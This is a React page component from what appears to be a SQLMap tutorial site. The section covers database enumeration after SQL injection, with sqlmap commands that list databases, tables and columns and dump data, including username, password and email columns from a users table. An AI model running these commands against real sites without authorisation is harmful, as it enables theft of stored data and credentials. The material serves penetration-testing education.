'use client'
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const enumSteps = [
  { step: 1, title: 'List Databases', cmd: 'sqlmap -u "http://target.com?id=1" --dbs', desc: 'Enumerate all database names' },
  { step: 2, title: 'List Tables', cmd: 'sqlmap -u "http://target.com?id=1" -D database_name --tables', desc: 'Show tables in a specific database' },
  { step: 3, title: 'List Columns', cmd: 'sqlmap -u "http://target.com?id=1" -D database_name -T table_name --columns', desc: 'Show columns in a specific table' },
  { step: 4, title: 'Dump Data', cmd: 'sqlmap -u "http://target.com?id=1" -D database_name -T table_name --dump', desc: 'Extract all data from a table' },
];

export default function DatabaseEnumerationPage() {
  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-database-2-line" />
          SQLMap Section 4 of 13
        </div>
        <DocHeading level={1}>Database Enumeration</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Once SQL injection is confirmed, enumerate the database structure step by step.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-4">Enumeration Workflow</h3>
        <div className="space-y-4">
          {enumSteps.map((s) => (
            <div key={s.step} className="cyber-card p-4">
              <div className="flex items-start gap-3">
                <span className="w-6 h-6 rounded-full bg-cyber-red/10 border border-cyber-red/20 flex items-center justify-center text-cyber-red text-xs font-bold flex-shrink-0">
                  {s.step}
                </span>
                <div className="flex-1">
                  <h4 className="text-sm font-semibold text-white">{s.title}</h4>
                  <p className="text-xs text-cyber-text mt-1 mb-2">{s.desc}</p>
                  <CodeBlock code={s.cmd} />
                </div>
              </div>
            </div>
          ))}
        </div>
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Dump All Databases</h3>
        <p className="text-cyber-text text-sm mb-3">
          Extract everything at once (use with caution):
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --dump-all" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Target Specific Columns</h3>
        <p className="text-cyber-text text-sm mb-3">
          Dump only specific columns:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' -D mydb -T users -C username,password,email --dump" />
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h3 className="text-sm font-semibold text-white mb-3">Force Current Database</h3>
        <p className="text-cyber-text text-sm mb-3">
          Skip database enumeration if you know the name:
        </p>
        <CodeBlock code="sqlmap -u 'http://target.com?id=1' --current-db" />
      </motion.section>

      <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="flex gap-3">
          <a href="/sqlmap/data-extraction" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Data Extraction <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/sqlmap/detection" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-red hover:text-cyber-red transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}